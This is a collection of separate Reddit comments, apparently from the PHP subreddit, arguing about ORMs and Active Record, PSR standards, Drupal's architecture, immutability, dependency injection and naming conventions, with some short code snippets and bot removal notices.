No thanks 
It will never cease to amaze me how salty developers get over WordPress.
Without a quorum there's potential for everything but the most divisive proposals to be passed.
"Using stored procedures" - for what exactly? So far as caching is concerned, eloquent generates sql and binds data using PDO, so the queries should be cached nicely.
Problem with that is if you're using Laravel you have to use `created_at` rather than `createdAt`. 
&gt; I think this matters to both framework authors and end users as both want components that are interchangeable. What's the point of a different framework/library if the API is identical? The core differentiator between different libraries that solve the same problem _is_ generally API / user experience. While I don't disagree that users can benefit in some situations from standardization, by making that an unspoken secondary goal of the PSR's, bad design decisions have been made. Which is the core point of my article. Build PSR's for plumbing first, if users happen to benefit from that: great. But don't make it a goal, because user-facing API implies a very opinionated API. This is why we have a bunch of PSRs that aren't all that useful now, and eventually I imagine those PSR's will end up being useful for to one.
&gt;Naming properties has absolutely nothing to do with auto-generation of model classes. It's up to the auto-generator how the properties are named, so it's not per se the exactly same name. The auto-generator is going to define properties on the model class with the column names belonging to the table/class. &gt; Also, what the heck has repositories with naming properties on models to do? Absolutely nothing. OP is discussing the AR auto-gen'd property names (which mimic the schema) being stylishly different than camelCase. My point was that an intermediary repository could provide a class API with the conventional case he's after.
I over-use the hell out of repositories (my apps are long term (oldest one is 10 years old) apps for my agency - so I'm always weary of leaning on frameworks too much), but keeping AR's implementation from leaking can be a real pain in the ass. I need to pick up an ORM..
Many ORMs implement relational queries using multiple simple statements without joins; at least Yii2 and Laravel. Just use their debug panels to view log of db queries. You have to understand that ORMs are designed to simplify a set of common db tasks: CRUD, relational queries, applying scopes, etc. They won't handle complex or database-specific stuff efficiently -- that's why ORMs expose some kind of query builder and raw sql functionality. Still, joins are not evil and require no intermediate table when properly indexed; just learn sql and the ORM you use.
Many have commented on the syntax - for the record, I'm not a fan either, I just went with the syntax that had been previously proposed. I'm more than open to changing it. Just not sure what to change it to. The `@` operator is out of the question. Since these are expressions, they have to be enclosed in a delimiter pair of some sort. I can't think of one that isn't going to be ambiguous - but I'm totally open to suggestions :-) 
Why are you not using $correct0 in your query? You are using $name instead. Also why don't you escape the input via mysqli_real_escape_string()? 
Okay, so you can do wrong as well as right with this feature. Even if you created a syntax that prevents you from annotating with anything more than constant expressions, people are immediately going to create userland libraries that map those constant expressions to classes - exactly what the examples in the Attributes RFC are doing. So you have all the same risks of side-effects and various kinds of possible "evil", all you've done is add another layer of complexity. The situation is the same with Doctrine Annotations today - but many are happy with it, and most are not doing any of the horrible things you mentioned, so it's not a really solid argument. You can do good or evil with any language feature. 
We've been down that road, and it didn't pan out - PHP is an entirely different language, not like C# at all. If you were to aggressively evaluate expressions at parse time, imagine 20 different annotation classes being autoloaded on every request - even when none of them are actually being used. Disasterous. PHP has very different performance characteristics from C# and therefore needs a different design.
The code, besides the nooby escaping, seems ok. It might depend from the csv.
What language doesn't? What's the alternative?
https://youtu.be/DuB6UjEsY_Y watch this. And your comment about machine code would only be relevant given a very specific application. When you waste time learning a framework that relies on another framework, scales awfully, and is nearly impossible to update in an elegant manner, you are learning things the wrong way in my opinion.
Let's be honest; if this is /u/dracony, just own up to it. This whole drama has already destroyed your and your framework's reputation. The framework is finished in the PHP scene. Own up to it like a man (if you did it) and maybe the community will forgive.
I'm pretty sure there's a package for Eloquent that tackles this issue. Can't remember the name though, sorry. Edit: https://github.com/kirkbushell/eloquence
&gt; In this talk you will learn that PHP's huge ecosystem has way more to offer and PHP is not inferior at all to its evil cousin Node.js. The credibility of any article is lost on me when they resort to silly potshots like this. PHP and Node are two completely things for entirely different purposes. Getting them to talk to each other and take on their respective roles is not difficult, and acting like they're in direct competition with one another is stupid.
&gt; Every experience I've had with putting business logic into the database has been an overwhelmingly negative one. By even creating a database with relationships, you've already defined your business logic to some extent. In fact, I would say, you've defined it rather explicitly. I've never seen databases labeled "generic table", "generic column", "generic product table". They're more than names and addresses; they're more than identify keys. The more complicated the relationships with the databases (primary, secondary), the tables and the columns within those tables (especially with foreign keys, rules, et al), the more the business logic is expressed. In fact, these things tend to be really obfuscated and difficult to get at, as I believe you were implying when you said your experiences had been overwhelmingly negative. I would argue the contrary to what you said, due to the fact that SQL tends to be so difficult, one should build it and treat it like a completely separate entity, capable of doing everything on its own, stored procedures, views, security, like it was a floating fortress that only took very standard input from any source whatsoever and spit out generic information to any source whatsoever (only of course providing the bare minimum). You stated that you are creating two forms of truth. Well, you have to concede that you're doing that anyway, so you have to build them both up as pairs so that the SQL does not have to rely on the PHP for anything and vice versa. Just my two cents.
&gt; Because if you learn Wordpress you're learn some very old fashioned PHP techni And yet learning Wordpress is the specific requirement they are trying to fulfil. 
I've created a prototype REST API to answer this question :) Would also serve the non-PHP world. Is that something useable? (Not made public yet, but basics work)
Why do you think that an array for each post is not clean or readable? I think it's the most straightforward way, I mean, that's exactly what arrays are for. Anything else is over engineering and will actually make code less readable.
Consider that I am unsure how this perfectly valid "array" would be interpreted: &lt;?php $arr = [0=&gt;1,1,'3',1=&gt;2,'what'=&gt;'the',9=&gt;10,'ten'=&gt;11,10=&gt;'eleven']; var_dump($arr); // is the following valid,is there an expected outcome? [$what, $umm, $ten, $zero, $eleven, $nine, $two] = $arr; 
You can do this with AWS CloudFront: http://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/PrivateContent.html
This may sound counter intuitive, but why not store the comment count and last comment time in your posts table itself? You won't be able to call it well normalized after that, but you wouldn't be hammering your database every time when you want to list posts with comment count and the last comment time. 
Despite I make 70-80% of my income out of Drupal projects, this is outright true. To counter the ridiculously complex queries, there are EntityFieldQuery and field_attach_* functions that can help you only update a particular field. Also, there are now ways to cache the entire entity to the cache, essentially reduring the database table joins. This design isn't without its pros either. I have seen video fields (that need to store URL, dimensions, cdecs, etc). If an entity needs to have fields that can store multiple values, for multiple languages, and each field contains multiple key-value data, the Drupal design makes perfect sense. For everything else, it's absolutely garbage. 
I did something like this by creating symlinks to the media folders for the user based on their session and a keep-alive javascript call to a session script. It was way less overhead to do garbage collection on inactivity over trying to constantly re-authenticate any other way. It was for adult content (very high traffic) and there was a need to be lean while preventing leeching.
I've heard craft is good. But 200 bucks a project seems like a terrible business model. 
I agree, it definitely has its pros. And you know, I don't even mind EAV. For stuff like translatable individual fields with a possibly unlimited number of values, it does make sense. It's just that Drupal's implementation of it is utter shit. Drupal 8 has made some steps in the right direction, but the architecture itself remains a huge convoluted mess where everything is defined in the global namespace and half your stuff is stored in global variables. Drupal 8 just manages to hide it behind a pretense of being object-oriented. I had high hopes for Drupal 8 when I learned they were going to base it off Symfony2. But then they turned out to just loosely base their own crappy stuff on what Symfony2 does, and not use the things that could solve the most problems. The abstractions they *do* use are the request and response abstractions - possibly the simplest ones to write yourself. And you know what, that would be fine, it it actually worked. But as it is now, defining functions starting with file_ or user_ has a good chance of breaking stuff. Need to load multiple views on one page? Better not need a pager! Real-world example: I needed a list of news articles with a comment count shown beneath them. Simple enough, right? I mean, in a good EAV model, it shouldn't matter whether your value is a string, an integer, or another entity, right? Wrong. Turns out that you need a view to show your comment count, and you need a view to show your article list. So you do what many Drupal developers do, you use Display Suite to make a news list view mode for your article, and use it in your news listing. You the define a comment count view that does nothing more than fetch the number of comments attached to a specific article, and you stick it in your view mode. The you define your list view, which uses that, and you slap a paper on it. All is well, except your pager now only shows if the first article in the listing has more comments than there are news items on a single page of the listing. Read that again, and tell me that makes sense. Turns out that for all the abstraction and overengineering, *pagers are stored in a handful of global variables*. And every view you load constructs a paper. And because by the time you render your news items, the paper for your listing has already been constructed, your first news item nearly overwrites that pager because there's no way in hell that in a plug-in based architecture there might have been anything else that needs a pager. Makes perfect sense! And then there's the fact that using a function you'd expect to get a field's value from a node instead returns an abstraction of the field *instance*, from which you can then get an abstraction of *a list of values*, from which you can then get an abstraction of *a single field value*, from which you can then finally get the real value. It's been written by people who have *no idea* what the word abstraction means - they wrap everything in a fuck ton of classes, and forget that abstraction means *not having to worry about that shit*. Instead I have to spend time learning about implementation details because otherwise I can't properly show a field value in a template that isn't specific to a single view mode. To be fair, EntityFieldQuery is a nice addition - it eliminates the need for developers to worry about how fields are stored - except you still need to worry about what's a *field* and what's a *property*, and that's honestly pretty iconic. A good abstraction would figure these things out itself, and let you use use a node's title and it's introduction text in the same manner. But no, let's take something nice and not do it right. Drupal's history in a nutshell. And then there's the fact that anything, anywhere, can influence (and break) anything just by defining a fucking function. Debugging a Drupal project is hell. There's a reason I downright refuse to work with Drupal these days. 
I also think moving to D8 with all the problems and just wrapping it in a class is a bad idea. The arrays are now classes (the famous form_array for example), and majority of the D7 problems still stays there, only hidden within a protected or a private property. I started with Drupal 6-7 years ago, and they all made sense with the lack of CSS3 pseudo selectors. An Ajax call sends *all* HTML IDs found in the page, D7 still has no proper Ajax detach behavior, and everything you said about pagers, field abstraction, etc. Turns out there there is a set of people we'd like to call Site Builders. They have to learn every dot in the Drupal fields, display suite, panels, rules, and with enough stress and &gt;50 modules, you can build a site that matches your requirements functionality wise without having to write a single piece of code. Except that you will need to write shit ton of preprocess modules to just maneuver the extra stuff the modules bring, but not complete. Drupal does not even have unit tests up until recently, so it's not worth talking about debugging. I think the Drupal developers deserve more payment, and completely agree with &gt; I'm assuming most of that extra income goes directly toward therapy and reconstructive facial surgery required due to constant facepalming. /u/thepsion5 
well, if they log in, create a [session](http://php.net/manual/en/session.examples.basic.php) and check in the movie.php, if users are logged in. that way, only logged in people can access it, even if other people have the link.
&gt; You realize that Anthony Ferrara and Derick Rethans are chief among those who are pushing people out of the community Citation needed. 
If anyone is interested in the equivalent JSR: http://cr.openjdk.java.net/~dlsmith/jsr335-0.6.1/A.html
when PEAR did not exist and PHPLib ruled ^^
E.g. those function names: http://news.php.net/php.internals/70691
If you don't mind sharing, what do your bundles look like? How much of the content manager is custom and how much of it is ready to go right out of the packaged box?
Fair points, but my main point anyway of talking about PSR-3 was to illustrate that User-API was a core design concern. Maybe this is not so much a problem for PSR-3 (because it's so simple anyway). It's become a problem for 6 and 7.
Wouldn't it be more explicit and natural that a `Closure` could only implement an interface defining `__invoke()`? I wouldn't see that as a limitation, and it would be much simpler to understand.
 interface Sam { public function foo(); } class CallableSam implements Sam{ private $callable; public function __construct(callable $callable) { $this-&gt;callable = $callable; } public function foo() { return call_user_func($this-&gt;callable); } } $sam = new CallableSam(function () { // ... }); Why not this?
Out of all the problems with JMS Serializer (bad performance, weird configuration, inability to adapt it for our needs) I wrote a (de)serialization library called Serializard: https://github.com/thunderer/Serializard . It supports XML among other formats and allows you to register custom handlers for any class - basically solves all the problems with the process while not getting in your way. I was able to migrate our project from JMS Serializer to Serializard in under 2 days and now all our projects use it. If you spot any problem with it, please report the issue in its GitHub repository and I'll be happy to help.
/r/forhire
Don't usering wordpress ples. ... But in all seriousness. Just go through their documents. Probably check out some other themes by users. Experiment, try to make your own projects and remember ... Have a good time. Oh and don't try to memorise every little thing. That's what Google is for. You can always reference them later.
Indeed, I might be too drunk to properly decypher the rationale behind this.
+1 on phabricator. We use it as a two people team and it's done us wonders. Just pitching in to say this tool is not just for mediawiki or facebook.
So, anyone an example? I'm tired of hearing AR has limits without even mentioning a real world example - only because they heard some theoretical issues.
Learning wordpress php will not make you a php programmer. And vice versa. Wordpress makes the mistake of using php as a templating language. This confuses many wordpress developers because they get good at building themes and suddenly think they know php. PHP as a templating language is stunted and is not really programming. Its at most going back to when php was just a scripting language. What you really want to learn is custom wordpress themes. By all means get really good at using php templates with wordpress and all of the custom wordpress stuff therein. Just keep in mind that in the end you will be a wordpress theme developer not a php developer. I encourage you to learn php if you want, learn laravel or whatever. But you don't need to do that to achieve your goal. 
I appreciate that explanation. It was much better than the RFC text. That being said..I think callable was bad, but this is definitely the next (ugly) natural step in runtime safety, if you're using that type.
Can you please give an example. I know of 1 or 2 instances of the community grabbing pitchforks in relation to the PHPixie saga. But other than that I've found this subreddit and the PHP community as a whole quite tolerant, welcoming and helpful. 
Loading the website on an S5, I have very little interest in signing up. There is nothing informing me of the treasures beyond the registration wall.
[removed]
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Those other answers are terrible. Those are obviously people that didn't know the answer but still wanted SO's internet points.
https://youtu.be/RkP_OGDCLY0
*EDIT* I should point out, that you do need to 'separate' the injector from the global state when building up information inside it like this, so that you don't accidentally re-use information. $globalInjector = createInjectorFromConfig(); while($keepRunning == true) { // This separates the injector from the global config so that $injector = clone $globalInjector; // Any information that is added to the injector when running code doesn't get used // on the next loop $injector-&gt;execute($task-&gt;getNextTask()); } =============== I use [rdlowrey/auryn](https://github.com/rdlowrey/auryn) as my dependency injection container - it has a very useful delegate functionality that allows you to delegate the creation of objects to functions, that allows you to control how objects get made. For your problem I'd probably extract the queries out to be in a repository, and then delegate the creation of the repository to a function that creates the appropriate one. interface AdmissionsRepo { public function getAdmissions(); } class AdminAdmissionsRepo implements AdmissionsRepo { public function __construct(SomeOrm $someORM) { $this-&gt;someORM = $someORM; } public function getData() { $query = "select * from admissions"; return $this-&gt;someORM-&gt;run($query); } } class SocielSecurityAdmissionsRepo implements AdmissionsRepo { public function __construct(SomeOrm $someORM) { $this-&gt;someORM = $someORM; } public function getData() { $query = "select * from admissions where social_security = 3"; return $this-&gt;someORM-&gt;run($query); } } public function allAdmissions(AdmissionsRepo $admissionsRepo) { $data = $admissionsRepo-&gt;getData(); return json_encode($data); } function createAdmissionsRepo(User $user, SomeORM $someORM) if($user-&gt;hasRole('Administration')) { return new AdminAdmissionsRepo($someORM); } else { return new SocielSecurityAdmissionsRepo($someORM); } } $injector-&gt;delegate('AdmissionsRepo', createAdmissionsRepo); $injector-&gt;execute('allAdmissions'); This is 'slightly' verbose - but it allows your code that is actually using the repository to not be aware of the implementation details at all. 
I dont know of a specific pattern. but the only thing, I immediately can think of that truely "lends itself" towards the spirit of your question, would be to implement a sort of polyphormism version on a user object. That allows you to overwrite the base user functions via its speialization, thus changing how the query is executed. I don't really know how to write it, so its going to be pseudo code -&gt; base class User { //Some generic query } class admin extends User { //Some specific query } class Tester extends User overwrite GetIngo() { //Some specific query } this will let you execute queries based solely on which instance of user you are logged in as. I think it will have the lowest possible bindings, and the highest cohesion for the classes. But binding content based on who you are logged in as, is a little odd? Its like putting a layer between the user and the dataAccess for no apparent reason? I would suggest you simply create a normal layered achitecture, and then implement the MVC pattern on your data-access layer? So a facade object, controllers, and models to pass your information back on fourth in. And then simply make either the user class a parameter that is sent with requests? You could perhaps mix the approch so the users contain what is relevant at the access level? That seems like a proper approach?
Depends how much you charge :P But don't forget the personal license is free.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
ReactPHP is a port of NodeJs. With that bit of information, does that sentence make more sense to you?
Yes, in theory. In practice, there are interfaces that could/should have been defined with `__invoke` as the method name, but weren't, due at least in part to them being created before _invoke was a thing .g. http://php.net/manual/en/class.countable.php Which means that you couldn't create a closure that satisfies that interface.....which is annoying.
I may be wrong about this, as I haven't tested it. But if you extend \Illuminate\Database\Eloquent\Model, you might be able to override the updated/created at column names. I'd be surprised if you couldn't.
Definitely. I actually didn't mention that because it was getting pretty busy with people in the local town and you get some shifty looks for skating around with a massive camera rig. But yeah, for languages where asynchronous processing can occur, immutability becomes incredibly valuable.
There's a time and a place for immutability - but it's not a silver bullet. For example, a basic immutable class, class MyClass { private $prop; public function __construct($prop) { $this-&gt;prop = $prop; } public function withProp($prop) { $copy = clone $this; $this-&gt;prop = $prop; return $copy; } } Subsequent code can change the object we're dealing with at any point. $obj = new MyClass('a'); $obj = $obj-&gt;withProp('b'); $obj = $obj-&gt;withProp('c'); var_dump($obj); // prop contains c Now imagine $obj was being passed around all over the place and constantly being overwritten. Being immutable doesn't really help the debug effort like you described in your video. If MyClass was actually a HTTP Response object - some parts of your code will be adding cookie &amp; header info, other parts of your code will be adding the response body etc. It'd be wasteful if each mutation created a new object, verbose example; $r = new Response(200); $r = $r-&gt;withCookie('something','value','exp'); $r = $r-&gt;withCookie('somethingelse','value','exp'); $r = $r-&gt;withHeader('X-This-Is-Wasteful','value'); $r = $r-&gt;withBody($someHtmlOrJsonString); $r-&gt;send(); Instead, it'd probably make more sense to just have a mutable response object that is incrementally mutated into its final form. If MyClass were a HTTP Request object, maybe it'd make more sense to be immutable. The original HTTP request is an event that has happened. You cannot change the past. So it'd make more sense to be immutable for the same reason that `$_GET['param'] = 'something';` is daft. tl;dr: Pick the right tool for the job. Immutable doesn't fit every scenario.
Yeah definitely, I think immutability in language like PHP is best served through value objects. You want too mutate it? You have to use something that can construct the duplicate. The Request you were talking about is a good example as it doesn't have any mutator methods, just getters. But let's talk about your Response example. Yeah it is suboptimal to create new instances all the time. But, consider this. We have a mutable response. In one of those layers that process the Response lives a small EventListener that will take a reference to your Response but will not mutate it. Somewhere down the execution road an event will be invoked that will ultimately be caught by the listener that we talked before. And boom, that listener can now modify your Response. This was far fetched example and as it is, it would be considered bad architectural decision to do something like that, but you see what i mean. Nobody can modify your object if it's immutable. I am not arguing for the Response to be immutable (or mutable), just showing that every solution has its negatives and in this particular case it's pretty close since Response doesn't get changed so often (like &lt;5 times per request) and CPU time is cheap.
Immutability is about making sure your dynamic data is handled consistently and won't change on-the-fly up under you. Linking immutability to "just write HTML" makes no sense. You don't want to ever write 2 million pages manually for an e-commerce site and need to update them every time an order is made do you? Or a bank manually updating everyone's HTML page when they do any kind of charge along with every movement that charge makes? Immutability here let's you have set templates that you can ensure are handled with a consistent data set from storage to view. It is about making sure your objects are consistent and that you can easily track where changes occur. Leads to more verbose code but improves the consistency and reliability of the system overall.
I was just generalising to make the point that I'm agreeing with op that there's a time and a place for immutability. Apologies!
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Aren't there languages (functional?) where *everything* is immutable by the language design? I'm guessing they still do stuff.
Correct me if I'm wrong but doesn't php need to execute in completely separate processes (meaning it doesn't operate via threading but forking?)
If the user roles are mutually exclusive (and the the query conditions are sufficiently complex) I just use a factory pattern to create different classes. This avoids a big if statement and you can use inheritance to avoid the shared conditions of the query.
Don't let me die stupid. What did I miss in Active Record and the naming properties issue from the OP?
This reminds me of the time the CTO at one of my previous employers (and I swear to everyone I am not making this up) told us that we need to use event-driven systems for everything because, and I quote, "loops don't scale." Sure, anything you do piss-poorly probably doesn't scale.
The interesting thing is, that even though it's very likely just that minute/second legacy error, people in comments were looking for complex explanations why that specific value was intended to be like that. Kinda tells a lot about us humans and how we desperately try to give meaning to everything. We forget that sometimes things are just the way they are, because no one bothered to change them. 
&gt; It'd be wasteful if each mutation created a new object This has been disproven over and over again. Stop with the FUD.
that is not good commenting, and doesn't meet any kind of commenting standards. Something like this: /** * check to see if a specified template exists * @param string $template the template to check the existence of within the template paths array * @return boolean */ public function template_exists($template) This is good commenting on a method that seems fairly obvious as to what it does. Do you really want to go through the body of the method to see what type $template is or what its value represents? These kinds of comments make everything much easier to work with.
&gt; But then again maybe I should just bite the bullet and rewrite everything to use DQL. This will involve significantly more work however :( You should definitely do this.
Can't this just be addressed by a FIG-like standard on adding a metadata method to classes? Then access it statically when needed and never call it in runtime? If we want the method to be discarded at runtime then a RFC could be voted for a method scope keyword, like "internal _annotations() { return [1,2,3];}"
The point is to define a way in which two pieces of software should work together and in this logging context that should be summarized to `log` method. If a consumer of that standard wants to extend it, it should be able to do so. That extension can be used by its consumers, but should not be relied upon by any consumer of the original standard. &amp;nbsp; Taking that log example, the standard should contain only `log` method and any consumer can extend it with `error`, `info`, `debug`, etc. &amp;nbsp; Ex: Laravel can chose to extend the standard and add `info`, `debug` and `warning` methods. Any non-Laravel user will rely on the original standard and any Laravel user can chose to rely on the standard or its extension, which has those extra methods. &amp;nbsp; From my point of view: - Those extra methods are redundant, because they all `log` which makes them just some glorified shortcuts, so it should be decision of the consumer of that particular standard if (s)he wants to implement them. - Making a standard more strict that it should may kill diversity between packages/frameworks (_I like diversity, but take that with a grain of salt ; I'm looking at you node_). - For same reason of diversity, a standard should not enforce a particular implementation. (_i.e: You should do that**.**_ not _You should do it this way**:**_). If Joe wants his objects to be mutable, let him do that. &amp;nbsp; Maybe with this new FIG 3.0 thing these extensions could be taken into consideration which will allow anyone to add things to the original standard, but not removing things or changing the original definitions. (_i.e: I can add new methods besides `log`, but I can't change `log`'s signature and/or remove it_). 
Apache can run PHP via mod_php with either worker or prefork MPM. Prefork is non-threaded and the default, so you should be safe there. Running mod_php with worker MPM can cause problems with certain (lots) of extensions.
Now I'm disappointed this is not a subreddit :( *edit: /u/nikic/ was previously /r/nikic*
This is a horrible format and a horrible explanation.
You do understand that SOLID principles are a MUST in any relevant piece of software, right? Well, ActiveRecord violates with wild abandon the very first rule: SRP (Single Responsability Principle). Models extend the a base god-class, and are thus tightly coupled to it. You will not be able to write UNIT tests (you will be able to write tests, they just won't be unit tests), because you will not be able to separate your model logic from the orm logic (and thus will be unable to mock your dependencies). ActiveRecord is an obsolete pattern. But it "gets the job done", and is much simpler than the alternatives (like the Repository pattern) so a few frameworks still opt to use it (like Laravel).
The first one that comes to mind is Javascript.
Wrote a couple for session-handling and CSRF-handling. Probably the 90000000th time I post them in this subreddit though: * https://github.com/Ocramius/PSR7Session * https://github.com/Ocramius/PSR7Csrf Currently considering writing one for automatically adding [HTTP2 push headers](https://blog.cloudflare.com/using-http-2-server-push-with-php/) (via simplistic, very restrictive regex)
There's a [large list in the PHP-FIG middleware proposal](https://github.com/shadowhand/fig-standards/blob/c7929423603306f213cbaccb5a00969cea86da52/proposed/middleware-meta.md#43-middleware-implementations).
A lot of people publicly say they hate php... but secretly they love it ;)
**Format:** Personally, I don't really want to watch a video to get development advice -- It's much slower than reading, because I have to go at your pace. I can't skip the introduction. I can't scan it quickly for relevant information or to see if it's worth my time. It's very had to give code samples or to use diagrams that may illustrate a difficult point. If you _are_ going to do a video, at least do it sitting down. To me the skateboarding thing felt forced, gimmicky, and uncomfortable. **Content:** - Spend less time on the analogy. In fact, I'd skip it altogether. - Mention other reasons for using immutable objects (readability is the main one that comes to mind for me). - Mention the concept of a value object - Mention cases when immutable objects are useful vs. not useful. - Probably others can add more here. 
In JavaScript just about everything is mutable by default. You need to jump through hoops to make them immutable. That said, yes, many functional languages either don't support or make mutability difficult.
do an ollie
Java is a language that was developed as a marketing ploy more than something that addressed a particular need. PHP is one of the Internet's first web-based languages, and it works very well for what it does and the majority of the net runs on it. I never knew there was any argument about that.
IMO: The whole setting of the video really detracted from the message/discussion. Hey you're there.. okay you're talkin... oh we're moving okay let's walk and tal.. okay we're at a different spot, still moving though. Now we're stationary with people moving around, wonder where this is, did he just set the camera there and stroll up? Wonder what that looks like to those people, okay we're talking again. I wish we used the word knackered, outro time. Think you get the point. None of that really added to the topic. Instead it was really distracting, for me at least.
For some its akin to being tied up and whipped by a woman in leather :p They are so totally into it, but only behind closed doors, and always with a safe word for when they get too deep.
I've run into a lot of people who claim to hate PHP, but I usually find out they haven't touched it since pre-PHP3 and even then never used it in a professional, day-to-day capacity (or if they did they were stuck maintaining god-awful legacy code). To me, it doesn't really matter what I'm using, if I can't make my tools work for me then that's often an indication that I need to assess my approach rather than blame the software.
&gt;You can serialize the same object to XML in lots of various ways, for various contexts and security levels Yes and you can create reusable filter annotations. I literally fail to see how you cannot do this with annotation + proper output formatter. I am completely confused by what you are calling garbage software. What critical thought I am lacking? Am I supposed to create a 100 class member parser by hand for 5 classes? Maybe throw in a few hundred files of factories and interfaces? Also dear god, if I want to parse a fucking simple as shit XML file without security levels and contexts to care about. Be it a simple config or definition file. Let me use an annotated parser without you being a fucking shitler who wants to spend a month writing a complicated xml system for no reason. It's a bloody fucking tool not meant to solve every problem. God forbid my simple application which has a single application config file has to implement biometric authentication on the xml parser.
You're not the only one: https://github.com/squizlabs/PHP_CodeSniffer/issues/883#issuecomment-216686359
Old habits: `Abstract{Foo}`, `{Foo}Interface`, `{Foo}Trait`. A non-trivial number of developers dislike that, based on variations of the argument that classes should then be named `Foo{Class}`. My response is that, for better or worse, PHP folks default to using classes at least an order-of-magnitude more frequently than interfaces or traits, so it's the outliers that deserve the extra bit of notation in the name.
I really enjoyed the format, kept it interesting. The mic sounded fine to me.
This hasn't been the case at all for us. We've had many successful projects that have went on for multiple phases and Drupal ultimately saved the client a lot of money. It's less opinionated than Wordpress, but more opinionated than Symfony 2. If those opinions fit within what you're trying to accomplish, than it's a powerful tool that can save you a lot of time. If you are building something that has a very unique set of requirements, or doesn't follow any sort of traditional workflows, than it's probably not a good fit. I say this as someone whose underbid $500k Symfony 2 projects and been able to deliver successfully, and whose also refused to bid against $1m Symfony 2 projects because Drupal isn't a good fit. Drupal has been a strong platform for us that has scaled from $100k to $1m+ with ease, you just have to master it the same way you'd have to master anything else when your estimating and building projects in that space.
I'm plenty willing to accept arguments in favour of PHP as it exists today, but &gt; Java is a language that was developed as a marketing ploy more than something that addressed a particular need. Is a really low blow considering 1) whether true or false is irrelevant to its value in fulfilling particular needs and more importantly I think in this case 2) PHP was created to solve problems in a way most of the PHP community considers bad practices now (Just shoving some C-wrapper code inline in HTML and call it a day) and is the source of a lot of the things even PHP-lovers generally admit are downsides to PHP. Also Java has a very particular need that it being a big corporate language does meet: You can trust if you write code in it now you'll have reasonably suitable ways to keep it going for probably a few decades. There's a lot of really huge, high-value codebases in it and if Java ever became unmaintained you can trust there's too much money in keeping reasonably backwards-compatible JVM working to keep all those codebases alive to let it slip into non-functionality. The biggest corporate users of PHP aren't in that sort of arrangement. PHP didn't play its cards right for that sort of audience. And that's fine; there are different programming projects with different goals and variety is basically good. Pretending Java is useless or for hacks or something, though, would only serve to reinforce negative stereotypes about PHP programmers being inexperienced or inept because it's balking at what is pretty demonstrably something a huge number of people think is the right sort of tool to solve a lot of big problems.
This is a good start http://www.phptherightway.com/ Focus on the language first. Frameworks can abstract away some important things you'll need to know.
Laravel does this a lot using what it calls managers `Managers`. There are some small differences, an object instead of a Closure and what not, but the same theory. It's how Laravel allows you to change a value in your config and switch session managers, cache libraries, or database drivers. I use this a lot when working with API wrappers. I set up one implementation of the api to write to a log file(depending on the API) and one concrete implementation. Makes it faster when you don't care about the response from the API, but want to verify that the call worked.
It depends on the language. In Java Strings are immutable, so string concatenation (e.g. String x = x+"y") destroys x and re-creates it. This is terribly inefficient, which is why StringBuilder() is recommended for string concats.
&gt; terribly inefficient Have any benchmarks to back up that statement? I don't think anyone would argue it's _more_ inefficient, but _terribly more_ seems like a huge overstep. Although if I wanted the security of immutability I would never be using a language like PHP. Immutability only works well as a language construct, otherwise what do you really gain when you're always having to double check yourself because you can't really be certain the lifecycle of some object really is immutable?
I just follow the [Symfony Coding Standards](http://symfony.com/doc/current/contributing/code/standards.html#naming-conventions) on this: - Suffix traits with Trait - Suffix interfaces with Interface - Suffix exceptions with Exception - Prefix abstract classes with Abstract Just keeps everything consistent.
Immutable code changes all the time, it just doesn't overwrite, that has almost nothing to do with how html works.
I once saw a poorly written PHP script in 2007 and now I have an everlasting hatred towards an entire language. Now excuse me while I update all of our Javascript projects from Angular 2 to React because Hacker News said it's better. ^^^just ^^^kidding ^^^we ^^^love ^^^you ^^^javascript
Wait so you're saying i have a safeword for PHP? What should it be?
eval
I just whipped up a quick benchmark which concatenates a string 100000 times: http://pastebin.com/3AEiBDXt Output is: Concat duration is 2442 Stringbuilder duration is 4 For small strings it's not a big problem, but I personally ran into this issue while building a web scraper. The function that I had to read lines of response data and concat it into the html body could take minutes with concatenation but sub-second with stringbuilder.
Yeah same, really refreshing to see content delivered in a different way, don't think I ever remember seeing an uncle bob video where he wasn't in space or something. As for the content, I thought it was described well, but I do agree with a comment above about doing an ollie on a longboard, just throwing that down :)
This short article was meant to be demonstrating how dynamic resolution works. For me the lambda function captures the essence of the problem which is indeed dynamic and the closure is the computation that does the resolving. FeedReaderInterface[] is of course an equally valid approach but, at least for me, it somewhat obscures the underlying issue. With that you're essentially collecting every possibility and inject all of them, like a specialised container.
Yeah totally agree with this, immutable.js / react is all sorts of awsome.
I'm also annoyed by their inconsistent brace usage. Pick one or the other but intermixing the two based on type of usage is annoying.
That's terrible. :(
&gt; With that you're essentially collecting every possibility and inject all of them, like a specialised container. Correct: I minimize the amount of runtime moving parts. Basically strategy pattern &gt;&gt;&gt;&gt; state mutation.
How about using the strategy pattern? With a `FeedReader` class: `register(FeedReaderStrategy $feedReaderStrategy)` allows us to register `JsonFeedReaderStrategy` and `XmlFeedReaderStrategy`, and `read($url)` calls the strategy that supports the given feed.
Well... crap. :) Deprecate error suppression?
This is exactly my opinion about them. You can write shitty code and beautiful code both from PHP. Java and many other languages force you to do it the proper way, but you can do all the same in PHP too. 
&gt;Have any benchmarks to back up that statement? It's a pretty well-known issue in the Java community, even with the JVMs generational GC structure, which (all things considered) probably does a good job of handling the extremely-short-lived String objects. Ex: http://javapapers.com/java/java-string-vs-stringbuilder-vs-stringbuffer-concatenation-performance-micro-benchmark/ (The Builder/Buffer difference has to do with thread-safety measures.)
My limited experience with java was that ugly/shitty code is just as easily created, just in a different package (OOP guaranteed lol). Then again, the last time I wrote Java for any length of time was in university which I am sad to say I never finished :(
So I saw a guy doing some demonstration with MEAN. My double curly braces with Angular kicks PHPs ass, yo. 
